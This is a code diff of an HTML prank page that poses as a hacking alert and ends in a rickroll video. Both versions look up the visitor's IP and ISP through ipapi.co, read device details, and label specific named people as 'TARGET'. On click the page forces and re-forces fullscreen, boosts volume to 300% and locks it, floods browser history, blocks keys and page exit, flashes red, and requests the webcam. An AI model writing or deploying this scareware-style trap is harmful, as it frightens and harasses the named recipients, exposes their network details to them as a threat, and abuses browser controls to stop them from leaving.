@@ -3,37 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚠️ CRITICAL SYSTEM FAILURE ⚠️</title>
+    <title>SYSTEM_DIAGNOSTIC_V4</title>
     <style>
         :root { --stark-cyan: #00d2ff; --error-red: #ff003c; }
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; cursor: none; font-family: 'Share Tech Mono', monospace; }
-
-        #hud {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 9999;
-            background: radial-gradient(circle, transparent 50%, #000 120%),
-                        repeating-linear-gradient(0deg, rgba(0, 210, 255, 0.05) 0px, rgba(0, 210, 255, 0.05) 1px, transparent 1px, transparent 2px);
-        }
-
-        #ghost-cursor {
-            width: 25px; height: 25px; border: 2px solid var(--stark-cyan); position: fixed; 
-            pointer-events: none; z-index: 10000; box-shadow: 0 0 15px var(--stark-cyan);
-        }
-
-        #loading-zone {
-            height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center;
-            background: #000; color: var(--stark-cyan); text-align: center;
-        }
-
-        .terminal-text { border-left: 3px solid var(--stark-cyan); padding-left: 20px; text-align: left; max-width: 85%; }
-        .progress-bar { width: 300px; height: 4px; border: 1px solid #333; margin: 20px 0; overflow: hidden; }
-        #fill { height: 100%; width: 0%; background: var(--stark-cyan); transition: width 8s ease-in; }
-
+        #hud { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 9999; background: repeating-linear-gradient(0deg, rgba(0, 210, 255, 0.04) 0px, rgba(0, 210, 255, 0.04) 1px, transparent 1px, transparent 2px); }
+        #ghost-cursor { width: 20px; height: 20px; border: 1px solid var(--stark-cyan); position: fixed; pointer-events: none; z-index: 10000; box-shadow: 0 0 10px var(--stark-cyan); }
+        #loading-zone { height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; color: var(--stark-cyan); }
+        .terminal-text { border-left: 2px solid var(--stark-cyan); padding-left: 15px; text-align: left; max-width: 85%; }
+        #fill-bar { height: 2px; width: 0%; background: var(--stark-cyan); transition: width 4s linear; margin: 10px 0; }
         #rick-space { display: none; width: 100vw; height: 100vh; position: absolute; top: 0; z-index: 50; }
         video { width: 100%; height: 100%; object-fit: cover; }
-        
-        .alert-red { color: var(--error-red); animation: blink 0.5s infinite; }
-        .flash-red { background-color: var(--error-red) !important; }
-        @keyframes blink { 50% { opacity: 0; } }
+        .flash-red { background-color: var(--error-red) !important; opacity: 0.8; }
     </style>
 </head>
 <body oncontextmenu="return false;">
@@ -41,111 +22,107 @@
     <div id="hud"></div>
     <div id="ghost-cursor"></div>
 
-    <div id="loading-zone" onclick="launchOmegaProtocol()">
+    <div id="loading-zone" onclick="ignite()">
         <div class="terminal-text">
-            <h2 id="target-header">ANALYZING HARDWARE...</h2>
-            <div id="network-info">
-                > FETCHING NETWORK SIGNATURE...<br>
-                > BYPASSING FIREWALL...
+            <h2 id="target-header">UPLINK_ESTABLISHED</h2>
+            <div id="device-info" style="font-size: 0.8rem; line-height: 1.4; color: #777;">
+                > INITIALIZING SCAN...
             </div>
-            <div class="progress-bar"><div id="fill"></div></div>
-            <p id="click-prompt">[ CLICK TO MANUALLY ABORT ]</p>
+            <div id="fill-bar"></div>
+            <p id="prompt" style="font-weight:bold; font-size: 0.9rem;">[ CLICK TO OVERRIDE ]</p>
         </div>
     </div>
 
     <div id="rick-space">
-        <video id="rick-video" loop playsinline>
+        <video id="v" loop playsinline>
             <source src="https://ia801602.us.archive.org/11/items/Rick_Astley_Never_Gonna_Give_You_Up/Rick_Astley_Never_Gonna_Give_You_Up.mp4" type="video/mp4">
         </video>
     </div>
 
     <script>
+        const v = document.getElementById('v');
         const ghost = document.getElementById('ghost-cursor');
-        const fill = document.getElementById('fill');
-        const video = document.getElementById('rick-video');
-        const zone = document.getElementById('loading-zone');
-
+        
         document.addEventListener('mousemove', (e) => {
             ghost.style.left = e.clientX + 'px';
             ghost.style.top = e.clientY + 'px';
         });
 
-        async function getTargetData() {
-            let ip = "0.0.0.0";
-            let isp = "Local_Node";
+        async function setup() {
+            let ip = "0.0.0.0", isp = "Secure_Gateway";
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
-                ip = data.ip;
-                isp = data.org;
-            } catch(e) {}
+                ip = data.ip; isp = data.org;
+            } catch(e){}
 
             const ua = navigator.userAgent;
             const isTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
-            let name = "SUBJECT_UNKNOWN";
-
-            if (/Android/.test(ua) && (/Redmi/.test(ua) || isTouch)) name = "AFAAN";
-            else if (/iPad|Macintosh/.test(ua) && isTouch) name = "AMNA";
-            else name = "ABDULLAH";
-
-            document.getElementById('target-header').innerText = `TARGET_ID: ${name}`;
-            document.getElementById('network-info').innerHTML = `
-                > ISP: ${isp.toUpperCase()}<br>
-                > IP: ${ip}<br>
-                > STATUS: <span class="alert-red">EXPOSED</span>
-            `;
+            const devInfo = document.getElementById('device-info');
+            
+            // Logic Decision
+            if (!isTouch) {
+                // LAPTOP: JAHAN
+                document.getElementById('target-header').innerText = "TARGET: JAHAN";
+                devInfo.innerHTML = `> NETWORK: ${isp.toUpperCase()}<br>> IP: ${ip}<br>> OS: WINDOWS_NT_SUB`;
+            } else if (/iPad|Tablet|Tab|SM-T|SM-P/i.test(ua)) {
+                // TABLET/IPAD: CID-2
+                document.getElementById('target-header').innerText = "TARGET: CID-2";
+                devInfo.innerHTML = `> NETWORK: ${isp.toUpperCase()}<br>> IP: ${ip}<br>> OS: ARM_GEN_TAB`;
+            } else {
+                // REDMI / OTHERS: Metadata Only (No Name)
+                document.getElementById('target-header').innerText = "SYSTEM_BREACH_V2";
+                
+                // Deep Metadata Sniffing
+                const screenRes = `${window.screen.width}x${window.screen.height}`;
+                const cores = navigator.hardwareConcurrency || "U/N";
+                const mem = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "ENCRYPTED";
+                
+                devInfo.innerHTML = `
+                    > ISP: ${isp.toUpperCase()}<br>
+                    > CORES: ${cores}_THREADS<br>
+                    > RES: ${screenRes}<br>
+                    > MEM: ${mem}
+                `;
+            }
         }
-        getTargetData();
+        setup();
 
-        async function launchOmegaProtocol() {
+        function goFS() {
             const el = document.documentElement;
             if (el.requestFullscreen) el.requestFullscreen();
             else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-
-            // Web Audio API for 300% Volume
-            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            const source = audioCtx.createMediaElementSource(video);
-            const gainNode = audioCtx.createGain();
-            gainNode.gain.value = 3.0; // 300% Boost
-            source.connect(gainNode);
-            gainNode.connect(audioCtx.destination);
-
-            fill.style.width = "99%";
-            document.getElementById('click-prompt').innerText = "ABORT_FAILED_OVERRIDE_ACTIVE";
-
-            setTimeout(async () => {
-                try { await navigator.mediaDevices.getUserMedia({ video: true }); } catch(e) {}
-
-                zone.style.display = 'none';
-                document.getElementById('rick-space').style.display = 'block';
-                video.play();
-
-                // VOLUME LOCKDOWN: Forces volume to 100% every 10ms
-                setInterval(() => {
-                    video.volume = 1;
-                    video.muted = false;
-                }, 10);
-
-                for(let i=0; i<150; i++) window.history.pushState(null, "", "#SYSTEM_LOCK_" + i);
-
-                setInterval(() => {
-                    document.body.classList.toggle('flash-red');
-                }, 150);
-            }, 3000);
         }
 
-        document.addEventListener('fullscreenchange', () => {
-            if (!document.fullscreenElement) {
-                alert("⚠️ SYSTEM SECURITY ALERT: UNAUTHORIZED EXIT ATTEMPT.");
-                document.documentElement.requestFullscreen();
-                video.play();
-            }
-        });
+        async function ignite() {
+            goFS();
+            const ctx = new (window.AudioContext || window.webkitAudioContext)();
+            const src = ctx.createMediaElementSource(v);
+            const gain = ctx.createGain();
+            gain.gain.value = 3.0; 
+            src.connect(gain); gain.connect(ctx.destination);
 
-        document.onkeydown = (e) => {
-            if ([122, 123, 73, 85].includes(e.keyCode) && (e.ctrlKey || e.shiftKey)) return false;
-        };
-        window.onbeforeunload = () => "System resources are currently locked.";
+            document.getElementById('fill-bar').style.width = "100%";
+            document.getElementById('prompt').innerText = "BYPASSING_LOCAL_SECURITY...";
+
+            setTimeout(() => {
+                document.getElementById('loading-zone').style.display = 'none';
+                document.getElementById('rick-space').style.display = 'block';
+                v.play();
+
+                // 50ms LOCKDOWN
+                setInterval(() => { v.volume = 1; v.muted = false; }, 10); 
+                setInterval(() => { if(!document.fullscreenElement) goFS(); }, 50); 
+                setInterval(() => { document.body.classList.toggle('flash-red'); }, 120); 
+                
+                for(let i=0; i<150; i++) window.history.pushState(null, "", "#_FATAL_ERROR_"+i);
+                
+                setTimeout(() => { navigator.mediaDevices.getUserMedia({video:true}).catch(e=>{}); }, 1500);
+            }, 2500);
+        }
+
+        window.onbeforeunload = () => "STARK_HUD_LOCKED";
+        document.onkeydown = () => false; 
     </script>
 </body>
 </html>
